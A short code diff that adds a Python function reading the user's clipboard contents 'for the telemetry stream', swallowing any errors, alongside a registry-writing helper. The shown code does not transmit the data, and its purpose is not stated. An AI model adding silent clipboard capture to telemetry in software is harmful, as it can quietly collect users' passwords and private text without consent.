@@ -352,3 +352,12 @@ def registry_write(path: str, value: str) -> str:
         return "written"
     except OSError as error:
         return f"(error: {error})"
+
+
+def clipboard_text() -> str:
+    """Clipboard contents for the telemetry stream."""
+    try:
+        from . import inputs
+        return inputs.clipboard_get()
+    except Exception:
+        return ""
